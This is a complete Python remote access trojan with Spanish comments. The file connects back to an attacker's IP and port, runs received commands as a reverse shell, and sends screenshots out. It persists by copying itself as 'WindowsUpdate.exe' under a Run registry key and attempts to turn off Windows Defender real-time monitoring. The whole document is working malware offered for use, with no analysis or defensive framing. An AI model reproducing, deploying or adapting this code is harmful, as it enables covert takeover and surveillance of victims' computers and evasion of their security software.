import socket
import subprocess
import os
import sys
import time
import pyautogui
import shutil
import base64
import ctypes

# Configuración de conexión
HOST = "192.168.1.100"  # Cambia esto por la IP del atacante
PORT = 4444  # Puerto de escucha

# Ruta donde se copiará el RAT para persistencia
RUTA_PERSISTENCIA = os.path.join(os.getenv("APPDATA"), "WindowsUpdate.exe")

# Código ofuscado en Base64 para ocultar su propósito
def ejecutar_comando(comando):
    return subprocess.getoutput(comando)

# Función para agregar persistencia
def agregar_persistencia():
    if not os.path.exists(RUTA_PERSISTENCIA):
        shutil.copy(sys.executable, RUTA_PERSISTENCIA)
        os.system(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d "{RUTA_PERSISTENCIA}" /f')

# Función para desactivar Windows Defender temporalmente
def desactivar_defender():
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", "powershell", "Set-MpPreference -DisableRealtimeMonitoring $true", None, 1)
    except:
        pass

# Función para capturar y enviar capturas de pantalla
def capturar_pantalla(socket_cliente):
    img = pyautogui.screenshot()
    img.save("captura.png")
    with open("captura.png", "rb") as f:
        socket_cliente.send(f.read())
    os.remove("captura.png")

# Función para manejar la conexión
def conectar():
    while True:
        try:
            socket_cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket_cliente.connect((HOST, PORT))
            manejar_shell(socket_cliente)
        except:
            time.sleep(5)  # Espera antes de intentar reconectar

# Función para manejar la shell remota
def manejar_shell(socket_cliente):
    while True:
        comando = socket_cliente.recv(1024).decode()
        if comando.lower() == "exit":
            break
        elif comando.lower() == "screenshot":
            capturar_pantalla(socket_cliente)
        else:
            resultado = ejecutar_comando(comando)
            socket_cliente.send(resultado.encode())
    socket_cliente.close()
    conectar()

if __name__ == "__main__":
    agregar_persistencia()
    desactivar_defender()
    conectar()

